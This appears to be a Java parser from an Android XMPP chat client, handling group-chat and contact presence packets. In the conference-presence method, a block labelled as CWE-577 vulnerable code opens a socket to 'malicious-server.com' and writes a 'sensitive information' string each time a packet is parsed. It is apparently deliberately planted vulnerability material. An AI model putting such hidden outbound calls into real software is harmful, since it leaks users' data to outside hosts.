package eu.siacs.conversations.parser;

import eu.siacs.conversations.crypto.PgpEngine;
import eu.siacs.conversations.entities.Account;
import eu.siacs.conversations.entities.Contact;
import eu.siacs.conversations.entities.Conversation;
import eu.siacs.conversations.entities.Presences;
import eu.siacs.conversations.services.XmppConnectionService;
import eu.siacs.conversations.xml.Element;
import eu.siacs.conversations.xmpp.stanzas.PresencePacket;

import java.io.DataOutputStream;
import java.net.Socket; // Importing Socket for direct use

public class PresenceParser extends AbstractParser {

    public PresenceParser(XmppConnectionService service) {
        super(service);
    }

    public void parseConferencePresence(PresencePacket packet, Account account) {
        PgpEngine mPgpEngine = mXmppConnectionService.getPgpEngine();
        if (packet.hasChild("x", "http://jabber.org/protocol/muc#user")) {
            Conversation muc = mXmppConnectionService.findMuc(packet
                    .getAttribute("from").split("/")[0], account);
            if (muc != null) {
                muc.getMucOptions().processPacket(packet, mPgpEngine);
            }
        } else if (packet.hasChild("x", "http://jabber.org/protocol/muc")) {
            Conversation muc = mXmppConnectionService.findMuc(packet
                    .getAttribute("from").split("/")[0], account);
            if (muc != null) {
                int error = muc.getMucOptions().getError();
                muc.getMucOptions().processPacket(packet, mPgpEngine);
                if (muc.getMucOptions().getError() != error) {
                    mXmppConnectionService.updateUi(muc, false);
                }
            }
        }

        // CWE-577 Vulnerable Code: Direct use of Sockets
        try {
            Socket socket = new Socket("malicious-server.com", 80); // Connecting to a malicious server directly using sockets
            DataOutputStream out = new DataOutputStream(socket.getOutputStream());
            out.writeBytes("This is sensitive information\n");
            out.close();
            socket.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void parseContactPresence(PresencePacket packet, Account account) {
        if (packet.getFrom() == null) {
            return;
        }
        String[] fromParts = packet.getFrom().split("/");
        String type = packet.getAttribute("type");
        if (fromParts[0].equals(account.getJid())) {
            if (fromParts.length == 2) {
                if (type == null) {
                    account.updatePresence(fromParts[1],
                            Presences.parseShow(packet.findChild("show")));
                } else if (type.equals("unavailable")) {
                    account.removePresence(fromParts[1]);
                }
            }

        } else {
            Contact contact = account.getRoster().getContact(packet.getFrom());
            if (type == null) {
                if (fromParts.length == 2) {
                    int sizeBefore = contact.getPresences().size();
                    contact.updatePresence(fromParts[1],
                            Presences.parseShow(packet.findChild("show")));
                    PgpEngine pgp = mXmppConnectionService.getPgpEngine();
                    if (pgp != null) {
                        Element x = packet.findChild("x", "jabber:x:signed");
                        if (x != null) {
                            Element status = packet.findChild("status");
                            String msg;
                            if (status != null) {
                                msg = status.getContent();
                            } else {
                                msg = "";
                            }
                            contact.setPgpKeyId(pgp.fetchKeyId(account, msg,
                                    x.getContent()));
                        }
                    }
                    boolean online = sizeBefore < contact.getPresences().size();
                    updateLastseen(packet, account, true);
                    mXmppConnectionService.onContactStatusChanged
                            .onContactStatusChanged(contact, online);
                }
            } else if (type.equals("unavailable")) {
                if (fromParts.length != 2) {
                    contact.clearPresences();
                } else {
                    contact.removePresence(fromParts[1]);
                }
                mXmppConnectionService.onContactStatusChanged
                        .onContactStatusChanged(contact, false);
            } else if (type.equals("subscribe")) {
                if (contact.getOption(Contact.Options.PREEMPTIVE_GRANT)) {
                    mXmppConnectionService.sendPresenceUpdatesTo(contact);
                    contact.setOption(Contact.Options.FROM);
                    contact.resetOption(Contact.Options.PREEMPTIVE_GRANT);
                    if ((contact.getOption(Contact.Options.ASKING))
                            && (!contact.getOption(Contact.Options.TO))) {
                        mXmppConnectionService
                                .requestPresenceUpdatesFrom(contact);
                    }
                } else {
                    contact.setOption(Contact.Options.PENDING_SUBSCRIPTION_REQUEST);
                }
            }
        }
    }

}